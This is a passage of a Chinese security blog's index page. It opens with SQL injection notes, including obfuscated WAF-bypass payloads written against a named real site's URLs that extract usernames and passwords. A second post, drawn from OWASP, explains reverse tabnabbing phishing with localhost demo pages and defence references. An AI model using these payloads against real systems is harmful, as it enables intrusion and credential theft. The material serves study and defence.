class="keyword">select</span> 或 <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> 绕过</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">distinct</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">distinct</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,version() <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,version() <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure>

<p>云 WAF 绕过测试</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 阿里云防火墙</span><br><span class="line"># MYSQL</span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>edu.aliyun.com<span class="operator">/</span><span class="keyword">search</span>?q<span class="operator">=</span><span class="number">.8</span><span class="keyword">union</span><span class="comment">/*^%a0&#123;\a|^!!&#125;*/</span><span class="comment">/*select|\*!??@@-- /*/</span><span class="operator">*</span><span class="comment">-- %26%26^!~%*/select\N|!.7|1&amp;2%2%username,password from`finecms`.`fn_member` limit 1 offset 1-- # 整形注入</span></span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>edu.aliyun.com<span class="operator">/</span><span class="keyword">search</span>?q<span class="operator">=</span><span class="number">.8</span><span class="string">&#x27;|/*^ /*/* -- */1/*??@|@--  %0b%0a-- %0a*/union/*^%a0&#123;\a|^!!&#125;*//*select|\*!??@@--%20/*/*--%20%26%26^!~%*/select\N|!.7|1&amp;2%2%username,password from`finecms`.`fn_member` limit 1 offset 1-- # 字符型注入</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># MSSQL</span></span><br><span class="line"><span class="string">https://edu.aliyun.com/?id=1.8&#x27;</span><span class="keyword">union</span><span class="comment">--^!~%*/%0b/*%0aselect\N|!.7|1&amp;2%2%username,password from`finecms`.`fn_member` limit 1 offset 1)--</span></span><br></pre></td></tr></table></figure>
<p><img src="/../../../.gitbook/assets/c9b31b5011e96ee6bdd2c5bd10e08dc3258e535f34655ed4e4ab54cdfd646253.png">  </p>
<h3 id="MySQL-history"><a href="#MySQL-history" class="headerlink" title="MySQL history"></a>MySQL history</h3><p>You ca see other executions inside the MySQL reading the table: <strong>sys.x$statement_analysis</strong></p>
<h3 id="Version-alternatives"><a href="#Version-alternatives" class="headerlink" title="Version alternatives"></a>Version alternative<strong>s</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select @@innodb_version;</span><br><span class="line">+------------------+</span><br><span class="line">| @@innodb_version |</span><br><span class="line">+------------------+</span><br><span class="line">| 5.6.31           |</span><br><span class="line">+------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select @@version;</span><br><span class="line">+-------------------------+</span><br><span class="line">| @@version               |</span><br><span class="line">+-------------------------+</span><br><span class="line">| 5.6.31-0ubuntu0.15.10.1 |</span><br><span class="line">+-------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; mysql&gt; select version();</span><br><span class="line">+-------------------------+</span><br><span class="line">| version()               |</span><br><span class="line">+-------------------------+</span><br><span class="line">| 5.6.31-0ubuntu0.15.10.1 |</span><br><span class="line">+-------------------------+</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/17/Reverse-Tab-Nabbing%EF%BC%88%E5%8F%8D%E5%90%91%E6%A0%87%E7%AD%BE%E5%8A%AB%E6%8C%81%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="sing">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="sing's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/17/Reverse-Tab-Nabbing%EF%BC%88%E5%8F%8D%E5%90%91%E6%A0%87%E7%AD%BE%E5%8A%AB%E6%8C%81%EF%BC%89/" class="post-title-link" itemprop="url">Reverse Tab Nabbing（反向标签劫持）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-04-17 15:03:16 / Modified: 15:04:17" itemprop="dateCreated datePublished" datetime="2022-04-17T15:03:16+08:00">2022-04-17</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%92%93%E9%B1%BC/" itemprop="url" rel="index"><span itemprop="name">钓鱼</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Reverse-Tab-Nabbing（反向标签劫持）"><a href="#Reverse-Tab-Nabbing（反向标签劫持）" class="headerlink" title="Reverse Tab Nabbing（反向标签劫持）"></a>Reverse Tab Nabbing（反向标签劫持）</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>当攻击者能够控制 A 页面中包含<code>target=&quot;_blank&quot; rel=&quot;opener&quot;</code>属性的 <code>&lt;a&gt;</code> 标签的 <code>href</code> 的值时，攻击者可以通过 <code>href</code> 属性将 <code>&lt;a&gt;</code> 标签指向 B 页面（恶意页面）。诱导受害者点击A页面的 <code>&lt;a&gt;</code> 标签后，浏览器将转跳至 B 页面（恶意页面），攻击者可以通过在B 页面（恶意页面）设置的 JavaScript 对象（window.opener），强制在原来 a 页面所在的窗口打开另一个页面 C。</p>
<p>即使 A 页面中的 <code>&lt;a&gt;</code> 标签属性中不包含 **<code>rel=&quot;opener&quot;</code>**，但包含 <strong><code>target=&quot;_blank&quot;</code></strong> 的情况下，上述技术也可能实现。前提是 <code>&lt;a&gt;</code> 标签中没有包含 <code>rel=&quot;noopener&quot;</code> 或 <code>rel=&quot;noreferrer&quot;</code>的属性，或者浏览器对 <code>&lt;a&gt;</code> 标签设置的默认属性值不为 <code>rel=&quot;noopener&quot;</code> 或 <code>rel=&quot;noreferrer&quot;</code>。</p>
<p>基于上述技术，攻击者可以通过在 B 页面（恶意页面）设置 <code>window.opener.location = https://attacker.com/victim.html</code> 。并且将 C 页面模仿成与原来的 A 页面一样，诱骗受害者输入账号密码进行钓鱼，或者执行其他 JavaScript 攻击。 </p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="With-back-link"><a href="#With-back-link" class="headerlink" title="With back link"></a>With back link</h3><p>不使用 <code>rel=&quot;noopener&quot;</code> 或 <code>rel=&quot;noreferrer&quot;</code> 属性时父页面和子页面之间的链接：</p>
<p><img src="https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITH_LINK.png"></p>
<h3 id="Without-back-link"><a href="#Without-back-link" class="headerlink" title="Without back link"></a>Without back link</h3><p>使用 <code>rel=&quot;noopener&quot;</code> 或 <code>rel=&quot;noreferrer&quot;</code> 属性时父页面和子页面之间的链接：</p>
<p><img src="https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITHOUT_LINK.png"></p>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例 "></a>示例 <a href="#examples" id="examples"></a></h3><p>在文件夹中创建以下页面并使用 <code>python3 -m http.server</code> 运行 Web 服务器<br>然后，访问 <code>http://127.0.0.1:8000/vulnerable.html</code>，点击链接并观察 <strong>原始Tab</strong> 的 URL 变化。</p>
<ul>
<li><p><strong>vulnerable.html</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Victim Site<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://127.0.0.1:8000/malicious.html&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;opener&quot;</span>&gt;</span>Controlled by the attacker<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>malicious.html</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">opener</span>.<span class="property">location</span> = <span class="string">&quot;http://127.0.0.1:8000/malicious_redir.html&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>malicious_redir.html</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>New Malicious Site<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="可访问的属性"><a href="#可访问的属性" class="headerlink" title="可访问的属性 "></a>可访问的属性 <a href="#accessible-properties" id="accessible-properties"></a></h3><p>在跨域访问的情况下，恶意站点只能从 <strong>window.opener</strong> javascript 对象引用(这实际上是一个<strong>Window</strong> javascript类实例的引用)访问以下属性:</p>
<ul>
<li><code>opener.closed</code>: Returns a boolean value indicating whether a window has been closed or not.</li>
<li><code>opener.frames</code>: Returns all iframe elements in the current window.</li>
<li><code>opener.length</code>: Returns the number of iframe elements in the current window.</li>
<li><code>opener.opener</code>: Returns a reference to the window that created the window.</li>
<li><code>opener.parent</code>: Returns the parent window of the current window.</li>
<li><code>opener.self</code>: Returns the current window.</li>
<li><code>opener.top</code>: Returns the topmost browser window.</li>
</ul>
<p>如果域是相同的，那么恶意站点可以访问由<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/Window"><strong>window</strong></a> javascript对象引用的所有属性。</p>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>防御内容在 <a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#tabnabbing">HTML5 备忘单</a> 中。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/Reverse_Tabnabbing">https://owasp.org/www-community/attacks/Reverse_Tabnabbing</a></p>
<hr>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">sing</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">24</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
        <span class="site-state-item-count">37</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">sing</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  


</body>
</html>
